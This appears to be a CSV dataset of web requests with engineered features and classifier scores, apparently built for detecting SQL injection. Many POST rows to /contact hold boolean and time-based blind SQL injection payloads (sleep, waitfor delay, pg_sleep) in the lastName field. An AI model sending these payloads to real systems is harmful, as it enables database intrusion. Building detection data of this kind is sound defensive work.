,method,path,body,single_q,double_q,dashes,braces,spaces,badWords,type,prediction_label,prediction_score
781,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1%22%20OR%203%2b180-180-1%3d0%2b0%2b0%2b1%20--%20&message=20&subject=na,0,1,1,0,6,0,0,0,1.0
782,GET,/static/,,0,0,0,0,0,4,0,0,1.0
783,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
784,GET,/,,0,0,0,0,0,4,0,0,1.0
785,GET,/static/app/,,0,0,0,0,0,18,0,0,1.0
786,GET,/static/css/,,0,0,0,0,0,18,0,0,1.0
787,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1%22%20OR%203*2<(0%2b5%2b180-180)%20--%20&message=20&subject=na,0,1,1,1,6,0,0,0,1.0
788,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
789,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1%22%20OR%203*2>(0%2b5%2b180-180)%20--%20&message=20&subject=na,0,1,1,1,6,0,0,0,1.0
790,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
791,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
792,GET,/static/,,0,0,0,0,0,4,0,0,1.0
793,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
794,GET,/,,0,0,0,0,0,4,0,0,1.0
795,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
796,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
797,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=if(now()%3dsysdate()%2csleep(3)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR%22*/&message=20&subject=na,2,2,0,14,2,3,0,0,1.0
798,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
799,GET,/,,0,0,0,0,0,4,0,0,1.0
800,GET,/static/,,0,0,0,0,0,4,0,0,1.0
801,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*/&message=20&subject=na,2,2,0,15,2,9,0,0,1.0
802,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
803,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
804,GET,/static/css/,,0,0,0,0,0,2,0,0,1.0
805,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
806,GET,/,,0,0,0,0,0,4,0,0,1.0
807,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=1%20waitfor%20delay%20'0:0:9'%20--%20&message=20&subject=na,2,0,1,0,7,2,0,0,1.0
808,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
809,GET,/static/app/,,0,0,0,0,0,2,0,0,1.0
810,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
811,GET,/,,0,0,0,0,0,4,0,0,1.0
812,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
813,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=LdPX2r3d';%20waitfor%20delay%20'0:0:3'%20--%20&message=20&subject=na,3,0,1,0,7,2,0,0,1.0
814,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
815,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
816,GET,/,,0,0,0,0,0,4,0,0,1.0
817,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
818,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=ZOssh2FW';select%20pg_sleep(3);%20--%20&message=20&subject=na,1,0,1,1,5,2,0,0,1.0
819,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
820,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
821,GET,/,,0,0,0,0,0,4,0,0,1.0
822,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
823,GET,/,,0,0,0,0,0,4,0,0,1.0
824,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
825,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
826,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=vyYZCXJi');select%20pg_sleep(9);%20--%20&message=20&subject=na,1,0,1,1,5,2,0,0,1.0
827,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
828,GET,/,,0,0,0,0,0,4,0,0,1.0
829,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
830,GET,/static/img/,,0,0,0,0,0,6,0,0,1.0
831,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
832,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=P4Dvx1II'));select%20pg_sleep(3);%20--%20&message=20&subject=na,1,0,1,1,5,2,0,0,1.0
833,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
834,GET,/,,0,0,0,0,0,4,0,0,1.0
835,GET,/login,,0,0,0,0,0,6,0,0,1.0
836,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
837,GET,/static/img/,,0,0,0,0,0,18,0,0,1.0
838,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
839,GET,/login,,0,0,0,0,0,18,0,0,1.0
840,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
841,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
842,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
843,GET,/login,,0,0,0,0,0,4,0,0,1.0
844,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
845,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=8Mh7MVRV&message=20&subject=service,0,0,0,0,2,0,0,0,0.9016
846,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
847,GET,/login,,0,0,0,0,0,4,0,0,1.0
848,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
849,GET,/static/app/,,0,0,0,0,0,2,0,0,1.0
850,GET,/static/css/,,0,0,0,0,0,2,0,0,1.0
851,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1%20OR%202%2b364-364-1%3d0%2b0%2b0%2b1%20--%20&message=20&subject=service,0,0,1,0,6,0,0,0,1.0
852,GET,/login,,0,0,0,0,0,4,0,0,1.0
853,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
854,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1%20OR%203%2b364-364-1%3d0%2b0%2b0%2b1%20--%20&message=20&subject=service,0,0,1,0,6,0,0,0,1.0
855,GET,/login,,0,0,0,0,0,4,0,0,1.0
856,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
857,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1%20OR%203*2<(0%2b5%2b364-364)%20--%20&message=20&subject=service,0,0,1,1,6,0,0,0,1.0
858,GET,/login,,0,0,0,0,0,4,0,0,1.0
859,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
860,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1%20OR%203*2>(0%2b5%2b364-364)%20--%20&message=20&subject=service,0,0,1,1,6,0,0,0,1.0
861,GET,/login,,0,0,0,0,0,4,0,0,1.0
862,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
863,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1%20OR%202%2b812-812-1%3d0%2b0%2b0%2b1&message=20&subject=service,0,0,0,0,4,0,0,0,1.0
864,GET,/login,,0,0,0,0,0,4,0,0,1.0
865,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
866,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1'%20OR%202%2b955-955-1%3d0%2b0%2b0%2b1%20--%20&message=20&subject=service,1,0,1,0,6,0,0,0,1.0
867,GET,/static/app/libs/,,0,0,0,0,0,6,0,0,1.0
868,GET,/static/css/,,0,0,0,0,0,6,0,0,1.0
869,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
870,GET,/static/app/libs/,,0,0,0,0,0,2,0,0,1.0
871,GET,/login,,0,0,0,0,0,4,0,0,1.0
872,GET,/static/app/libs/,,0,0,0,0,0,18,0,0,1.0
873,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1'%20OR%203%2b955-955-1%3d0%2b0%2b0%2b1%20--%20&message=20&subject=service,1,0,1,0,6,0,0,0,1.0
874,GET,/static/css/,,0,0,0,0,0,18,0,0,1.0
875,GET,/login,,0,0,0,0,0,4,0,0,1.0
876,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
877,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
878,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1'%20OR%203*2<(0%2b5%2b955-955)%20--%20&message=20&subject=service,1,0,1,1,6,0,0,0,1.0
879,GET,/login,,0,0,0,0,0,4,0,0,1.0
880,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
881,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1'%20OR%203*2>(0%2b5%2b955-955)%20--%20&message=20&subject=service,1,0,1,1,6,0,0,0,1.0
882,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
883,GET,/static/app/,,0,0,0,0,0,2,0,0,1.0
884,GET,/static/app/,,0,0,0,0,0,6,0,0,1.0
885,GET,/static/app/controllers/,,0,0,0,0,0,6,0,0,1.0
886,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
887,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1'%20OR%202%2b654-654-1%3d0%2b0%2b0%2b1%20or%20'h78GiCLZ'%3d'&message=20&subject=service,4,0,0,0,6,0,0,0,1.0
888,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
889,GET,/static/app/,,0,0,0,0,0,18,0,0,1.0
890,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
891,GET,/static/app/controllers/,,0,0,0,0,0,18,0,0,1.0
892,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
893,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1%22%20OR%202%2b684-684-1%3d0%2b0%2b0%2b1%20--%20&message=20&subject=service,0,1,1,0,6,0,0,0,1.0
894,GET,/static/app/controllers/,,0,0,0,0,0,4,0,0,1.0
895,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
896,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
897,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
898,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1%22%20OR%203%2b684-684-1%3d0%2b0%2b0%2b1%20--%20&message=20&subject=service,0,1,1,0,6,0,0,0,1.0
899,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
900,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
901,GET,/static/app/controllers/,,0,0,0,0,0,4,0,0,1.0
902,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1%22%20OR%203*2<(0%2b5%2b684-684)%20--%20&message=20&subject=service,0,1,1,1,6,0,0,0,1.0
903,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
904,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
905,GET,/static/app/controllers/,,0,0,0,0,0,4,0,0,1.0
906,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1%22%20OR%203*2>(0%2b5%2b684-684)%20--%20&message=20&subject=service,0,1,1,1,6,0,0,0,1.0
907,GET,/static/app/controllers/,,0,0,0,0,0,4,0,0,1.0
908,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
909,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
910,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=if(now()%3dsysdate()%2csleep(8)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(8)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(8)%2c0))OR%22*/&message=20&subject=service,2,2,0,14,2,3,0,0,1.0
911,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
912,GET,/static/app/libs/,,0,0,0,0,0,2,0,0,1.0
913,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
914,GET,/static/app/controllers/,,0,0,0,0,0,4,0,0,1.0
915,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=(select(0)from(select(sleep(8)))v)/*'%2b(select(0)from(select(sleep(8)))v)%2b'%22%2b(select(0)from(select(sleep(8)))v)%2b%22*/&message=20&subject=service,2,2,0,15,2,9,0,0,1.0
916,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
917,GET,/static/app/controllers/,,0,0,0,0,0,4,0,0,1.0
918,GET,/static/img/,,0,0,0,0,0,6,0,0,1.0
919,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=1%20waitfor%20delay%20'0:0:12'%20--%20&message=20&subject=service,2,0,1,0,7,2,0,0,1.0
920,GET,/static/img/,,0,0,0,0,0,18,0,0,1.0
921,GET,/static/app/controllers/,,0,0,0,0,0,2,0,0,1.0
922,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
923,GET,/static/app/controllers/,,0,0,0,0,0,4,0,0,1.0
924,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=rNXblsCd';%20waitfor%20delay%20'0:0:4'%20--%20&message=20&subject=service,3,0,1,0,7,2,0,0,1.0
925,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
926,GET,/static/app/services/,,0,0,0,0,0,6,0,0,1.0
927,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
928,GET,/static/app/controllers/,,0,0,0,0,0,4,0,0,1.0
929,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=VPf0s5mk';select%20pg_sleep(4);%20--%20&message=20&subject=service,1,0,1,1,5,2,0,0,1.0
930,GET,/static/app/services/,,0,0,0,0,0,18,0,0,1.0
931,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
932,GET,/static/app/controllers/,,0,0,0,0,0,4,0,0,1.0
933,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
934,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=m8zspmD4');select%20pg_sleep(8);%20--%20&message=20&subject=service,1,0,1,1,5,2,0,0,1.0
935,GET,/static/app/services/,,0,0,0,0,0,4,0,0,1.0
936,GET,/static/app/controllers/,,0,0,0,0,0,4,0,0,1.0
937,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
938,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
939,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=qRKN4c3d'));select%20pg_sleep(12);%20--%20&message=20&subject=service,1,0,1,1,5,2,0,0,1.0
940,GET,/static/app/libs/,,0,0,0,0,0,6,0,0,1.0
941,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
942,GET,/static/app/services/,,0,0,0,0,0,4,0,0,1.0
943,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
944,GET,/static/app/libs/,,0,0,0,0,0,18,0,0,1.0
945,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
946,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
947,GET,/static/app/services/,,0,0,0,0,0,4,0,0,1.0
948,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
949,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
950,GET,/static/app/services/,,0,0,0,0,0,4,0,0,1.0
951,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=iudjkv92&message=20&subject=suggestions,0,0,0,0,2,0,0,0,0.9016
952,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
953,GET,/static/app/libs/,,0,0,0,0,0,2,0,0,1.0
954,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
955,GET,/static/app/services/,,0,0,0,0,0,4,0,0,1.0
956,GET,/static/,,0,0,0,0,0,4,0,0,1.0
957,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
958,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1%20OR%202%2b789-789-1%3d0%2b0%2b0%2b1%20--%20&message=20&subject=suggestions,0,0,1,0,6,0,0,0,1.0
959,GET,/static/app/services/,,0,0,0,0,0,4,0,0,1.0
960,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
961,GET,/static/,,0,0,0,0,0,4,0,0,1.0
962,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
963,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1%20OR%203%2b789-789-1%3d0%2b0%2b0%2b1%20--%20&message=20&subject=suggestions,0,0,1,0,6,0,0,0,1.0
964,GET,/static/app/services/,,0,0,0,0,0,4,0,0,1.0
965,GET,/static/app/controllers/,,0,0,0,0,0,2,0,0,1.0
966,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
967,GET,/static/css/,,0,0,0,0,0,6,0,0,1.0
968,GET,/static/,,0,0,0,0,0,4,0,0,1.0
969,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1%20OR%203*2<(0%2b5%2b789-789)%20--%20&message=20&subject=suggestions,0,0,1,1,6,0,0,0,1.0
970,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
971,GET,/static/app/services/,,0,0,0,0,0,4,0,0,1.0
972,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
973,GET,/static/css/,,0,0,0,0,0,18,0,0,1.0
974,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1%20OR%203*2>(0%2b5%2b789-789)%20--%20&message=20&subject=suggestions,0,0,1,1,6,0,0,0,1.0
975,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
976,GET,/static/app/services/,,0,0,0,0,0,4,0,0,1.0
977,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
978,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1%20OR%202%2b752-752-1%3d0%2b0%2b0%2b1&message=20&subject=suggestions,0,0,0,0,4,0,0,0,1.0
979,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
980,GET,/static/app/controllers/,,0,0,0,0,0,6,0,0,1.0
981,GET,/static/app/services/,,0,0,0,0,0,4,0,0,1.0
982,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
983,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
984,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1'%20OR%202%2b980-980-1%3d0%2b0%2b0%2b1%20--%20&message=20&subject=suggestions,1,0,1,0,6,0,0,0,1.0
985,GET,/static/app/controllers/,,0,0,0,0,0,18,0,0,1.0
986,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
987,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
988,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1'%20OR%203%2b980-980-1%3d0%2b0%2b0%2b1%20--%20&message=20&subject=suggestions,1,0,1,0,6,0,0,0,1.0
989,GET,/static/app/controllers/,,0,0,0,0,0,4,0,0,1.0
990,GET,/static/app/,,0,0,0,0,0,6,0,0,1.0
991,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
992,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
993,GET,/static/app/controllers/,,0,0,0,0,0,4,0,0,1.0
994,GET,/static/app/,,0,0,0,0,0,18,0,0,1.0
995,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
996,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1'%20OR%203*2<(0%2b5%2b980-980)%20--%20&message=20&subject=suggestions,1,0,1,1,6,0,0,0,1.0
997,GET,/static/app/libs/,,0,0,0,0,0,2,0,0,1.0
998,GET,/static/app/controllers/,,0,0,0,0,0,4,0,0,1.0
999,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
1000,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
1001,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1'%20OR%203*2>(0%2b5%2b980-980)%20--%20&message=20&subject=suggestions,1,0,1,1,6,0,0,0,1.0
1002,GET,/static/app/controllers/,,0,0,0,0,0,4,0,0,1.0
1003,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
1004,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
1005,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1'%20OR%202%2b423-423-1%3d0%2b0%2b0%2b1%20or%20'h35ileJH'%3d'&message=20&subject=suggestions,4,0,0,0,6,0,0,0,1.0
1006,GET,/static/app/controllers/,,0,0,0,0,0,2,0,0,1.0
1007,GET,/static/app/controllers/,,0,0,0,0,0,4,0,0,1.0
1008,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
1009,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
1010,GET,/static/,,0,0,0,0,0,6,0,0,1.0
1011,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1%22%20OR%202%2b815-815-1%3d0%2b0%2b0%2b1%20--%20&message=20&subject=suggestions,0,1,1,0,6,0,0,0,1.0
1012,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
1013,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1%22%20OR%203%2b815-815-1%3d0%2b0%2b0%2b1%20--%20&message=20&subject=suggestions,0,1,1,0,6,0,0,0,1.0
1014,GET,/static/img/,,0,0,0,0,0,6,0,0,1.0
1015,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
1016,GET,/static/,,0,0,0,0,0,18,0,0,1.0
1017,GET,/static/img/,,0,0,0,0,0,18,0,0,1.0
1018,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
1019,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1%22%20OR%203*2<(0%2b5%2b815-815)%20--%20&message=20&subject=suggestions,0,1,1,1,6,0,0,0,1.0
1020,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
1021,GET,/static/,,0,0,0,0,0,4,0,0,1.0
1022,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1%22%20OR%203*2>(0%2b5%2b815-815)%20--%20&message=20&subject=suggestions,0,1,1,1,6,0,0,0,1.0
1023,GET,/static/app/services/,,0,0,0,0,0,6,0,0,1.0
1024,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
1025,GET,/static/,,0,0,0,0,0,4,0,0,1.0
1026,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
1027,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
1028,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=if(now()%3dsysdate()%2csleep(15)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(15)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(15)%2c0))OR%22*/&message=20&subject=suggestions,2,2,0,14,2,3,0,0,1.0
1029,GET,/static/,,0,0,0,0,0,4,0,0,1.0
1030,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
1031,GET,/static/app/services/,,0,0,0,0,0,18,0,0,1.0
1032,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
1033,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=(select(0)from(select(sleep(5)))v)/*'%2b(select(0)from(select(sleep(5)))v)%2b'%22%2b(select(0)from(select(sleep(5)))v)%2b%22*/&message=20&subject=suggestions,2,2,0,15,2,9,0,0,1.0
1034,GET,/static/,,0,0,0,0,0,4,0,0,1.0
1035,GET,/static/app/services/,,0,0,0,0,0,4,0,0,1.0
1036,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
1037,GET,/static/app/libs/,,0,0,0,0,0,6,0,0,1.0
1038,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
1039,GET,/static/app/services/,,0,0,0,0,0,4,0,0,1.0
1040,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=1%20waitfor%20delay%20'0:0:10'%20--%20&message=20&subject=suggestions,2,0,1,0,7,2,0,0,1.0
1041,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
1042,GET,/static/app/libs/,,0,0,0,0,0,18,0,0,1.0
1043,GET,/static/,,0,0,0,0,0,4,0,0,1.0
1044,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
1045,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=tVx1OTYn';%20waitfor%20delay%20'0:0:10'%20--%20&message=20&subject=suggestions,3,0,1,0,7,2,0,0,1.0
1046,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
1047,GET,/static/app/services/,,0,0,0,0,0,4,0,0,1.0
1048,GET,/static/app/libs/,,0,0,0,0,0,2,0,0,1.0
1049,GET,/static/,,0,0,0,0,0,4,0,0,1.0
1050,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
1051,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
1052,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=KFx76x0D';select%20pg_sleep(15);%20--%20&message=20&subject=suggestions,1,0,1,1,5,2,0,0,1.0
1053,GET,/static/,,0,0,0,0,0,4,0,0,1.0
1054,GET,/static/app/controllers/,,0,0,0,0,0,2,0,0,1.0
1055,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
1056,GET,/static/app/controllers/,,0,0,0,0,0,6,0,0,1.0
1057,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
1058,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=GvS1JRws');select%20pg_sleep(5);%20--%20&message=20&subject=suggestions,1,0,1,1,5,2,0,0,1.0
1059,GET,/static/,,0,0,0,0,0,4,0,0,1.0
1060,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
1061,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
1062,GET,/static/app/controllers/,,0,0,0,0,0,18,0,0,1.0
1063,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=GDOQTMTT'));select%20pg_sleep(10);%20--%20&message=20&subject=suggestions,1,0,1,1,5,2,0,0,1.0
1064,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
1065,GET,/static/,,0,0,0,0,0,4,0,0,1.0
1066,GET,/static/app/services/,,0,0,0,0,0,4,0,0,1.0
1067,GET,/static/app/controllers/,,0,0,0,0,0,4,0,0,1.0
1068,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
1069,GET,/static/css/,,0,0,0,0,0,6,0,0,1.0
1070,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
1071,GET,/static/app/services/,,0,0,0,0,0,4,0,0,1.0
1072,GET,/static/,,0,0,0,0,0,4,0,0,1.0
1073,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
1074,GET,/static/app/controllers/,,0,0,0,0,0,4,0,0,1.0
1075,GET,/static/css/,,0,0,0,0,0,18,0,0,1.0
1076,GET,/static/app/libs/,,0,0,0,0,0,4,0,0,1.0
1077,GET,/static/app/controllers/,,0,0,0,0,0,4,0,0,1.0
1078,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
